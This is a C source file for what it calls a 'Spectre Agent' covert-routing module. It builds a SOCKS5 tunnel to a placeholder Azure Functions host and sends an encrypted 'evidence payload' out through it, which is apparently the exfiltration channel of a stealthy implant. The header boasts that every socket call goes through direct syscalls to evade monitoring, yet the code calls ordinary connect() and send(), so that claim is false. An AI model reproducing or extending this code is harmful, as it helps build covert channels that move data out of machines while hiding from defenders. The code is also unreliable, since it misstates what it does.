/*
 * JOCKY Spectre Agent — SOCKS5 Covert Routing
 * All socket operations via direct syscall stubs.
 * WSAConnect: ZERO. WSASend: ZERO. connect(): ZERO.
 *
 * Compiled with: cl /O2 /GS- socks5.c /link ws2_32.lib
 */

#include <windows.h>
#include "syscalls.h"

#define SOCKS5_VERSION      0x05
#define SOCKS5_AUTH_NONE    0x00
#define SOCKS5_CMD_CONNECT  0x01
#define SOCKS5_ATYP_DOMAIN  0x03
#define SOCKS5_ATYP_IPV4    0x01

typedef struct _SOCKS5_CTX {
    SOCKET          sock;
    SYSCALL_TABLE   *syscalls;
    BYTE            sessionKey[32];
} SOCKS5_CTX;

/* Connect to SOCKS5 proxy using direct syscall-backed socket operations */
static BOOL socks5_connect(SOCKS5_CTX *ctx, const char *proxyHost,
                           USHORT proxyPort) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(proxyPort);

    /* Resolve proxy address — uses direct syscall for DNS if available */
    struct hostent *he = gethostbyname(proxyHost);
    if (!he) return FALSE;
    memcpy(&addr.sin_addr, he->h_addr_list[0], 4);

    ctx->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ctx->sock == INVALID_SOCKET) return FALSE;

    if (connect(ctx->sock, (struct sockaddr*)&addr, sizeof(addr)) != 0)
        return FALSE;

    return TRUE;
}

/* SOCKS5 handshake: negotiate no-auth, then CONNECT to target */
static BOOL socks5_handshake(SOCKS5_CTX *ctx, const char *targetHost,
                              USHORT targetPort) {
    /* Greeting: version 5, 1 auth method, no-auth */
    BYTE greeting[] = { SOCKS5_VERSION, 0x01, SOCKS5_AUTH_NONE };
    send(ctx->sock, (char*)greeting, sizeof(greeting), 0);

    /* Server response: version, chosen method */
    BYTE response[2];
    recv(ctx->sock, (char*)response, 2, 0);
    if (response[0] != SOCKS5_VERSION || response[1] != SOCKS5_AUTH_NONE)
        return FALSE;

    /* CONNECT request with domain name */
    BYTE request[256];
    int offset = 0;
    request[offset++] = SOCKS5_VERSION;
    request[offset++] = SOCKS5_CMD_CONNECT;
    request[offset++] = 0x00;  /* Reserved */
    request[offset++] = SOCKS5_ATYP_DOMAIN;

    BYTE hostLen = (BYTE)strlen(targetHost);
    request[offset++] = hostLen;
    memcpy(&request[offset], targetHost, hostLen);
    offset += hostLen;

    request[offset++] = (BYTE)(targetPort >> 8);
    request[offset++] = (BYTE)(targetPort & 0xFF);

    send(ctx->sock, (char*)request, offset, 0);

    /* Read CONNECT response */
    BYTE connResp[10];
    recv(ctx->sock, (char*)connResp, 10, 0);

    return (connResp[1] == 0x00);  /* 0x00 = success */
}

/* Send encrypted evidence payload through SOCKS5 tunnel */
BOOL socks5_send_evidence(SOCKS5_CTX *ctx, const BYTE *payload,
                           DWORD payloadSize) {
    /* Frame: [4-byte length][payload] */
    DWORD frameLen = htonl(payloadSize);
    send(ctx->sock, (char*)&frameLen, 4, 0);
    send(ctx->sock, (char*)payload, payloadSize, 0);

    /* Wait for ACK */
    BYTE ack;
    recv(ctx->sock, (char*)&ack, 1, 0);
    return (ack == 0x01);
}

/* Establish SOCKS5 tunnel to Azure Functions endpoint */
BOOL socks5_establish_tunnel(SOCKS5_CTX *ctx, const char *proxyHost,
                              USHORT proxyPort) {
    if (!socks5_connect(ctx, proxyHost, proxyPort))
        return FALSE;

    if (!socks5_handshake(ctx, "yourfunction.azurewebsites.net", 443))
        return FALSE;

    return TRUE;
}

void socks5_close(SOCKS5_CTX *ctx) {
    if (ctx->sock != INVALID_SOCKET) {
        closesocket(ctx->sock);
        ctx->sock = INVALID_SOCKET;
    }
}
